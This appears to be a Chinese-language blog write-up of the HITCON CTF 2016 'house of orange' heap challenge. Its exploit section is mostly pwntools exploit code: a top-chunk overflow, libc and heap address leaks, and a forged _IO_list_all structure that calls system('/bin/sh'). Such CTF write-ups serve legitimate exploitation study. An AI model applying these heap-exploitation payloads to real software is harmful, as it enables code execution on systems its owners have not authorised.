---
title: hitcon 2016 house of orange
categories:
  - pwn
tags: house-of-orange
published: true
---

# Introduction

知识点：

[house_of_orange](https://github.com/shellphish/how2heap/blob/master/house_of_orange.c)

**[houseoforange](https://github.com/ctfs/write-ups-2016/tree/master/hitcon-ctf-2016/pwn/house-of-orange-500)**

houseoforange: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter
/lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a58bda41b65d38949498561b0f2b976ce5c0c301, stripped

{% highlight bash %}

    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled

{% endhighlight %}

这题每一个部分都设计的很精致的感觉，刚刚好4次 malloc，3 次 upgrade, `house of orange`  很精致的技术。

# Exploit

`house of orange` 的必要条件是能够 leak libc 和 heap。

溢出 top chunk 将其大小改写成较小的值，再 malloc 一个大于它的值使堆扩张后 free 掉 old top chunk，产生一个
unsorted bin chunk，仅仅是 unsorted bin addr 还不够，要 leak 堆地址需要对 malloc 更为熟悉，再 malloc 一个
large bin 大小的 chunk，unsorted bin 中的 chunk 会先放入其对应的 bin 中，若 old top 为 large bin 大小，其
fd_nextsize 和 bk_nextsize 域的值即为堆上的地址，此时 malloc 会扫描 bin，将 old top 进行分割来满足用户请求，
剩下的部分则又放入 unsorted bin 中。

溢出 top chunk 使其被放入 unsorted bin。

```python
build(0x1b0, p8(0)*0x1b0)

payload = p8(0)*(0x1b8+0x20)
payload += p64(0xe01)
upgrade(payload)

build(0xef0, p8(0)*0xef0)
```

leak，

```python
build(0x3f0, "A"*0x8)

...
0x556f556a0260: 0x00000000  0x00000000  0x00000401  0x00000000
0x556f556a0270: 0x41414141  0x41414141  0x550d0178  0x00007fb2
0x556f556a0280: 0x556a0260  0x0000556f  0x556a0260  0x0000556f
...

see()

p.recvuntil("A"*0x8)
libc_base = u64(p.recv(6).ljust(8, "\x00"))-0x3c5178
log.info("libc_base: "+hex(libc_base))

io_list_all = libc_base+io_list_off
system_addr = libc_base+system_off
unsorted_bin_addr = libc_base+unsorted_bin_off

upgrade("A"*0x10)

see()

p.recvuntil("A"*0x10)
heap_base = u64(p.recv(6).strip().ljust(8, "\x00"))-0x260
log.info("heap_base: "+hex(heap_base))
```

剩下的则是 house of orange 攻击链的构造。

```python
payload = p8(0)*0x410
payload += "/bin/sh\x00"
payload += p64(0x61)
payload += p64(unsorted_bin_addr)    
payload += p64(io_list_all-0x10)
payload += p64(2)
payload += p64(3)
payload += p8(0)*0x48
payload += p64(system_addr)
payload += p8(0)*0x58
payload += p64(heap_base+0x6e0)
upgrade(payload)
```

再调用一次 malloc 即可触发攻击链，成功调用 system("/bin/sh")。

[exp.py](https://github.com/0x3f97/pwn/tree/master/hitcon-ctf-2016-house-of-orange)
